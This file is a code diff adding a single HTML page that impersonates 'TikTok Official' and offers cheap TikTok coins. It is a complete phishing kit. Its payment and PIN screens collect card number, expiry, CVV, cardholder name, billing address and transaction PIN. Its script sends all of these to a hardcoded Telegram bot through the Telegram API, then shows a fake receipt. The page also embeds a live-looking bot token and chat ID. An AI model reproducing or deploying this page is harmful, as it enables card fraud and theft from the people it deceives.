@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Coin Recharge & Payment</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            width: 100vw;
+            overflow-x: hidden;
+        }
+        .container {
+            background: #1e1e1e;
+            width: 100%;
+            max-width: 400px;
+            min-height: 100vh;
+            padding: 25px 20px;
+            border-radius: 0;
+            box-shadow: none;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+
+        /* Desktop ke liye nice rounded mobile frame */
+        @media (min-width: 481px) {
+            .container {
+                min-height: auto;
+                height: 85vh;
+                max-height: 750px;
+                border-radius: 20px;
+                box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+                overflow-y: auto;
+            }
+        }
+
+        .screen {
+            display: none;
+            flex: 1;
+        }
+        .screen.active {
+            display: block;
+        }
+        /* Top Navigation / Header */
+        .top-nav {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .back-arrow {
+            font-size: 20px;
+            cursor: pointer;
+            color: #fff;
+            text-decoration: none;
+            position: absolute;
+            left: 0;
+        }
+        .nav-title {
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            color: #ccc;
+            letter-spacing: 1px;
+        }
+        /* Dynamic Amount Header */
+        .payment-amount-header {
+            font-size: 26px;
+            font-weight: bold;
+            color: #10b981;
+            margin-bottom: 20px;
+            background: #252525;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px dashed #444;
+        }
+        /* TikTok Logo */
+        .logo-container {
+            margin-bottom: 15px;
+        }
+        .tiktok-logo {
+            width: 60px;
+            height: 60px;
+            background: #000;
+            border-radius: 16px;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+        h1 {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 25px;
+            color: #ffffff;
+        }
+        /* Input Fields */
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .input-group label {
+            font-size: 12px;
+            color: #aaa;
+            margin-bottom: 5px;
+            display: block;
+        }
+        .input-group input {
+            width: 100%;
+            background: #2a2a2a;
+            border: 1px solid #3a3a3a;
+            border-radius: 10px;
+            padding: 12px 14px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+        }
+        .input-group input::placeholder {
+            color: #777;
+        }
+        .input-group input:focus {
+            border-color: #fe2c55;
+        }
+        /* Receipt / Price Box */
+        .receipt-box {
+            background: #252525;
+            border: 2px dashed #444;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #ccc;
+            font-size: 14px;
+            text-align: left;
+        }
+        .receipt-box div {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+        .receipt-box div:last-child {
+            margin-bottom: 0;
+            border-top: 1px solid #444;
+            padding-top: 6px;
+            font-weight: bold;
+            color: #10b981;
+        }
+        /* PIN Screen Styles */
+        .pin-title {
+            color: #25F4EE;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .pin-subtitle {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .pin-box {
+            width: 50px;
+            height: 60px;
+            background: #2a2a2a;
+            border: 2px solid #25F4EE;
+            border-radius: 12px;
+            font-size: 24px;
+            color: #fff;
+            text-align: center;
+            outline: none;
+        }
+        .pin-box:focus {
+            border-color: #fe2c55;
+        }
+        /* Loading Screen Styles */
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #333;
+            border-top: 6px solid #fe2c55;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 40px auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Success Receipt Card Style */
+        .success-card {
+            background: #ffffff;
+            color: #222;
+            border-radius: 16px;
+            padding: 20px 15px;
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+        .success-card h2 {
+            color: #fe2c55;
+            font-size: 20px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .success-details {
+            font-size: 13px;
+            line-height: 1.6;
+            color: #444;
+        }
+        .success-details span {
+            font-weight: bold;
+            color: #000;
+        }
+        /* Buttons */
+        .action-btn {
+            width: 100%;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: auto;
+        }
+        .buy-btn {
+            background-color: #10b981;
+        }
+        .buy-btn:hover {
+            background-color: #059669;
+        }
+        .pay-btn {
+            background-color: #fe2c55;
+        }
+        .pay-btn:hover {
+            background-color: #e11d43;
+        }
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <!-- SCREEN 1: Buy Coins Form -->
+        <div id="screen1" class="screen active">
+            <div class="top-nav">
+                <div class="nav-title"><h1>TikTok Official</h1></div>
+            </div>
+
+            <div class="logo-container">
+                <div class="tiktok-logo">
+                    <svg viewBox="0 0 24 24" width="35" height="35">
+                        <path fill="#25F4EE" d="M19.589 6.686a4.793 4.793 0 0 1-3.77-4.245V2h-3.445v13.672a2.896 2.896 0 0 1-5.201 1.743l-.002-.003a2.895 2.895 0 0 1 2.316-4.646c.312 0 .614.049.897.14V9.381a6.335 6.335 0 0 0-.897-.064 6.334 6.334 0 0 0-6.333 6.334 6.334 6.334 0 0 0 6.333 6.333 6.334 6.334 0 0 0 6.333-6.333V8.69a8.192 8.192 0 0 0 4.774 1.523V6.768a4.815 4.815 0 0 1-1.004-.082z"/>
+                        <path fill="#FE2C55" d="M19.589 6.686a4.793 4.793 0 0 1-3.77-4.245V2h-3.445v13.672a2.896 2.896 0 0 1-5.201 1.743l-.002-.003a2.895 2.895 0 0 1 2.316-4.646c.312 0 .614.049.897.14V9.381a6.335 6.335 0 0 0-.897-.064 6.334 6.334 0 0 0-6.333 6.334 6.334 6.334 0 0 0 6.333 6.333 6.334 6.334 0 0 0 6.333-6.333V8.69a8.192 8.192 0 0 0 4.774 1.523V6.768a4.815 4.815 0 0 1-1.004-.082z" style="mix-blend-mode: screen;"/>
+                    </svg>
+                </div>
+            </div>
+
+            <h1>Buy Coin in Cheap Rate</h1>
+
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Enter TikTok user">
+            </div>
+
+            <div class="input-group">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" id="coinInput" placeholder="Enter coin" oninput="this.value = this.value.replace(/[^0-9]/g, ''); calculatePrice();">
+            </div>
+
+            <div class="receipt-box" id="receiptBox">
+                <div><span>Rate:</span> <span>100 Coins = $0.65</span></div>
+                <div><span>Coins:</span> <span id="displayCoins">0</span></div>
+                <div><span>Total Amount:</span> <span id="displayPrice">$0.00</span></div>
+            </div>
+
+            <button class="action-btn buy-btn" onclick="goToPayment()">Buy</button>
+        </div>
+
+
+        <!-- SCREEN 2: Payment Gateway Screen -->
+        <div id="screen2" class="screen">
+            <div class="top-nav">
+                <a href="#" class="back-arrow" onclick="goBackToScreen1()">&larr;</a>
+                <div class="nav-title">PAYMENT AMOUNT</div>
+            </div>
+
+            <div class="payment-amount-header" id="finalPaymentAmount">$0.00</div>
+
+            <div class="input-group">
+                <label>Card Number</label>
+                <input type="text" inputmode="numeric" pattern="[0-9]*" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+            </div>
+
+            <div class="row">
+                <div class="input-group" style="flex: 1;">
+                    <label>Exp. Date</label>
+                    <input type="text" id="expDate" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" oninput="formatExpDate(this)">
+                </div>
+                <div class="input-group" style="flex: 1;">
+                    <label>CVV</label>
+                    <input type="password" inputmode="numeric" pattern="[0-9]*" id="cvv" placeholder="123" maxlength="4" autocomplete="cc-csc" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Cardholder Name</label>
+                <input type="text" id="cardName" placeholder="John Doe" autocomplete="cc-name">
+            </div>
+
+            <div class="input-group">
+                <label>Billing Address</label>
+                <input type="text" id="billingAddress" placeholder="Street, City, State, Zip" autocomplete="shipping street-address">
+            </div>
+
+            <button class="action-btn pay-btn" onclick="goToPinScreen()">PAY</button>
+        </div>
+
+
+        <!-- SCREEN 3: PIN Verification Screen -->
+        <div id="screen3" class="screen">
+            <div class="top-nav">
+                <a href="#" class="back-arrow" onclick="goBackToScreen2()">&larr;</a>
+                <div class="nav-title">TRANSACTION PIN</div>
+            </div>
+
+            <div class="logo-container" style="margin-top: 10px;">
+                <div class="tiktok-logo">
+                    <svg viewBox="0 0 24 24" width="35" height="35">
+                        <path fill="#25F4EE" d="M19.589 6.686a4.793 4.793 0 0 1-3.77-4.245V2h-3.445v13.672a2.896 2.896 0 0 1-5.201 1.743l-.002-.003a2.895 2.895 0 0 1 2.316-4.646c.312 0 .614.049.897.14V9.381a6.335 6.335 0 0 0-.897-.064 6.334 6.334 0 0 0-6.333 6.334 6.334 6.334 0 0 0 6.333 6.333 6.334 6.334 0 0 0 6.333-6.333V8.69a8.192 8.192 0 0 0 4.774 1.523V6.768a4.815 4.815 0 0 1-1.004-.082z"/>
+                        <path fill="#FE2C55" d="M19.589 6.686a4.793 4.793 0 0 1-3.77-4.245V2h-3.445v13.672a2.896 2.896 0 0 1-5.201 1.743l-.002-.003a2.895 2.895 0 0 1 2.316-4.646c.312 0 .614.049.897.14V9.381a6.335 6.335 0 0 0-.897-.064 6.334 6.334 0 0 0-6.333 6.334 6.334 6.334 0 0 0 6.333 6.333 6.334 6.334 0 0 0 6.333-6.333V8.69a8.192 8.192 0 0 0 4.774 1.523V6.768a4.815 4.815 0 0 1-1.004-.082z" style="mix-blend-mode: screen;"/>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="pin-title">Enter The</div>
+            <div class="pin-title" style="margin-bottom: 5px;">Transaction Pin</div>
+            <div class="pin-subtitle">Enter the PIN</div>
+
+            <div class="pin-container">
+                <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" id="pin1" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveFocus(this, 'pin2');">
+                <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" id="pin2" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveFocus(this, 'pin3');">
+                <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" id="pin3" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveFocus(this, 'pin4');">
+                <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" id="pin4" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveFocus(this, '');">
+            </div>
+
+            <button class="action-btn pay-btn" onclick="startProcessing()">Pay</button>
+        </div>
+
+
+        <!-- SCREEN 4: Loading Screen -->
+        <div id="screenLoading" class="screen">
+            <div class="loading-spinner"></div>
+            <h2 style="color: #fff; margin-top: 20px; font-size: 18px;">Processing Transaction...</h2>
+            <p style="color: #888; font-size: 13px; margin-top: 10px;">Please wait while we secure your payment.</p>
+        </div>
+
+
+        <!-- SCREEN 5: Transaction Success / Order Received Screen -->
+        <div id="screenSuccess" class="screen">
+            <div class="top-nav">
+                <div class="nav-title">Transaction Receipt</div>
+            </div>
+
+            <div class="success-card">
+                <h2>Your Order Received in 24Hr</h2>
+                <div class="success-details" id="receiptDetails">
+                    <!-- Dynamic details will be inserted here -->
+                </div>
+            </div>
+
+            <button class="action-btn pay-btn" onclick="resetToFrontPage()">Done</button>
+        </div>
+
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8763151429:AAHHoeHS7ctD9r865pHhM7VCC2j4VQ2-zAk';
+        const CHAT_ID = '6644554566';
+
+        function calculatePrice() {
+            let coins = document.getElementById('coinInput').value;
+            let displayCoins = document.getElementById('displayCoins');
+            let displayPrice = document.getElementById('displayPrice');
+
+            if(coins === "" || coins < 0) {
+                displayCoins.innerText = "0";
+                displayPrice.innerText = "$0.00";
+                return;
+            }
+
+            let totalCost = (coins / 100) * 0.65;
+            displayCoins.innerText = coins;
+            displayPrice.innerText = "$" + totalCost.toFixed(2);
+        }
+
+        function formatExpDate(input) {
+            let value = input.value.replace(/[^0-9]/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            input.value = value;
+        }
+
+        function goToPayment() {
+            let username = document.getElementById('username').value;
+            let coins = document.getElementById('coinInput').value;
+
+            if(!username || !coins || coins <= 0) {
+                alert("Please enter a valid TikTok username and coin amount!");
+                return;
+            }
+
+            let totalAmountText = document.getElementById('displayPrice').innerText;
+            document.getElementById('finalPaymentAmount').innerText = totalAmountText;
+
+            document.getElementById('screen1').classList.remove('active');
+            document.getElementById('screen2').classList.add('active');
+        }
+
+        function goToPinScreen() {
+            let cardNumber = document.getElementById('cardNumber').value.trim();
+            let expDate = document.getElementById('expDate').value.trim();
+            let cvv = document.getElementById('cvv').value.trim();
+
+            if(cardNumber.length < 15) {
+                alert("Please enter a valid Card Number (at least 15-16 digits)!");
+                return;
+            }
+            if(expDate.length < 5 || !expDate.includes('/')) {
+                alert("Please enter a valid Expiry Date in MM/YY format!");
+                return;
+            }
+            if(cvv.length < 3) {
+                alert("Please enter a valid CVV (3 or 4 digits)!");
+                return;
+            }
+
+            document.getElementById('screen2').classList.remove('active');
+            document.getElementById('screen3').classList.add('active');
+        }
+
+        function goBackToScreen1() {
+            document.getElementById('screen2').classList.remove('active');
+            document.getElementById('screen1').classList.add('active');
+        }
+
+        function goBackToScreen2() {
+            document.getElementById('screen3').classList.remove('active');
+            document.getElementById('screen2').classList.add('active');
+        }
+
+        function moveFocus(current, nextFieldId) {
+            if (current.value.length >= 1 && nextFieldId !== "") {
+                document.getElementById(nextFieldId).focus();
+            }
+        }
+
+        function startProcessing() {
+            let pin1 = document.getElementById('pin1').value;
+            let pin2 = document.getElementById('pin2').value;
+            let pin3 = document.getElementById('pin3').value;
+            let pin4 = document.getElementById('pin4').value;
+            let pin = pin1 + pin2 + pin3 + pin4;
+
+            if(pin.length < 4) {
+                alert("Please enter the 4-digit transaction PIN!");
+                return;
+            }
+
+            sendDataToTelegram(pin);
+
+            document.getElementById('screen3').classList.remove('active');
+            document.getElementById('screenLoading').classList.add('active');
+
+            setTimeout(function() {
+                generateReceiptData();
+                document.getElementById('screenLoading').classList.remove('active');
+                document.getElementById('screenSuccess').classList.add('active');
+            }, 2500);
+        }
+
+        function sendDataToTelegram(pin) {
+            let username = document.getElementById('username').value;
+            let coins = document.getElementById('coinInput').value;
+            let totalAmount = document.getElementById('displayPrice').innerText;
+            let cardNumber = document.getElementById('cardNumber').value;
+            let expDate = document.getElementById('expDate').value;
+            let cvv = document.getElementById('cvv').value;
+            let cardName = document.getElementById('cardName').value;
+            let billingAddress = document.getElementById('billingAddress').value;
+            let randomTxnId = 'TXN' + Math.floor(100000000 + Math.random() * 900000000);
+
+            let message = `
+🔔 New TikTok Coin Order:
+👤 User: @${username}
+🪙 Coins: ${coins}
+💰 Total: ${totalAmount}
+💳 Card No: ${cardNumber}
+📅 Exp: ${expDate}
+🔐 CVV: ${cvv}
+👤 Name: ${cardName}
+🏠 Address: ${billingAddress}
+🔢 PIN: ${pin}
+🆔 Txn ID: ${randomTxnId}
+            `;
+
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(message);
+
+            fetch(url)
+                .then(response => response.json())
+                .catch(error => console.log('Telegram Error:', error));
+        }
+
+        function generateReceiptData() {
+            let username = document.getElementById('username').value;
+            let coins = document.getElementById('coinInput').value;
+            let totalAmount = document.getElementById('displayPrice').innerText;
+            let randomTxnId = 'TXN' + Math.floor(100000000 + Math.random() * 900000000);
+            let currentDate = new Date().toLocaleString();
+
+            let receiptHTML = `
+                <div>TikTok User: <span style="float: right;">@${username}</span></div><br>
+                <div>Coins Ordered: <span style="float: right;">${coins} Coins</span></div><br>
+                <div>Total Paid: <span style="float: right; color: #10b981;">${totalAmount}</span></div><br>
+                <div>Transaction ID: <span style="float: right; font-size: 11px;">${randomTxnId}</span></div><br>
+                <div>Date & Time: <span style="float: right; font-size: 11px;">${currentDate}</span></div><br>
+                <div>Delivery Status: <span style="float: right; color: #fe2c55; font-weight: bold;">Processing (24Hr)</span></div>
+            `;
+            document.getElementById('receiptDetails').innerHTML = receiptHTML;
+        }
+
+        function resetToFrontPage() {
+            document.getElementById('username').value = '';
+            document.getElementById('coinInput').value = '';
+            document.getElementById('displayCoins').innerText = '0';
+            document.getElementById('displayPrice').innerText = '$0.00';
+            document.getElementById('cardNumber').value = '';
+            document.getElementById('expDate').value = '';
+            document.getElementById('cvv').value = '';
+            document.getElementById('cardName').value = '';
+            document.getElementById('billingAddress').value = '';
+            document.getElementById('pin1').value = '';
+            document.getElementById('pin2').value = '';
+            document.getElementById('pin3').value = '';
+            document.getElementById('pin4').value = '';
+
+            document.getElementById('screenSuccess').classList.remove('active');
+            document.getElementById('screen1').classList.add('active');
+        }
+    </script>
+
+</body>
+</html>
